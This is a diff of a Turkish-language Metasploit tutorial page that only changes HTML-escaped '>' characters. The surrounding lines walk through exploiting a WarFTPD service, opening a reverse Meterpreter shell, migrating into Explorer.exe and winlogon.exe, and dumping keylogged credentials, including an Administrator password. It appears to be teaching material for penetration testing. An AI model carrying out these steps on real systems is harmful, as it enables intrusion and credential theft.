@@ -51,7 +51,7 @@ Bir sisteme giriş sağlandığında iki yaklaşım sergileyebilirsiniz. Çok h�
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** **&gt;** exploit
+msf exploit**(**warftpd_165_user**)** **>** exploit
 
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
@@ -63,9 +63,9 @@ msf exploit**(**warftpd_165_user**)** **&gt;** exploit
 **[*********]** Sleeping before handling stage...
 **[*********]** Uploading DLL **(**75787 bytes**)**...
 **[*********]** Upload completed.
-**[*********]** Meterpreter session 4 opened **(**172.16.104.130:4444 -&gt; 172.16.104.145:1246**)**
+**[*********]** Meterpreter session 4 opened **(**172.16.104.130:4444 -> 172.16.104.145:1246**)**
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -74,7 +74,7 @@ Oturum açıldıktan sonra, tuşları kayıt etmek için `Explorer.exe` prosesin
 
 
 ```bash
-meterpreter **&gt;** ps
+meterpreter **>** ps
 
 Process list
 **============**
@@ -102,10 +102,10 @@ Process list
     972   TPAutoConnSvc.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe 
     1088  TPAutoConnect.exe  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe 
 
-meterpreter **&gt;** migrate 768
+meterpreter **>** migrate 768
 **[*********]** Migrating to 768...
 **[*********]** Migration completed successfully.
-meterpreter **&gt;** getpid
+meterpreter **>** getpid
 Current pid: 768
 ```
 
@@ -115,9 +115,9 @@ PID geçişini kontrol ettikten sonra keylogger işlemini başlatalım.
 
 
 ```bash
-meterpreter **&gt;** keyscan_start
+meterpreter **>** keyscan_start
 Starting the keystroke sniffer...
-meterpreter **&gt;** keyscan_dump
+meterpreter **>** keyscan_dump
 Dumping captured keystrokes...
    tgoogle.cm my credit amex   myusernamthi     amexpasswordpassword
 ```
@@ -132,7 +132,7 @@ Ayrıca, oturum açma bilgilerini de yakalamak isterseniz, `Explorer.exe` yerine
 
 
 ```bash
-meterpreter **&gt;** ps
+meterpreter **>** ps
 
 Process list
 **=================**
@@ -141,12 +141,12 @@ PID Name         Path
 --- ----         ----
 401 winlogon.exe C:\WINNT\system32\winlogon.exe
 
-meterpreter **&gt;** migrate 401
+meterpreter **>** migrate 401
 
 **[*********]** Migrating to 401...
 **[*********]** Migration completed successfully.
 
-meterpreter **&gt;** keyscan_start
+meterpreter **>** keyscan_start
 Starting the keystroke sniffer...
 ```
 
@@ -156,7 +156,7 @@ Kayıt esnasında bir Administrator kullanıcı oturumu açılmıştır. Sonucun
 
 
 ```bash
-meterpreter **&gt;** keyscan_dump
+meterpreter **>** keyscan_dump
 Dumping captured keystrokes...
 Administrator ohnoes1vebeenh4x0red!
 ```
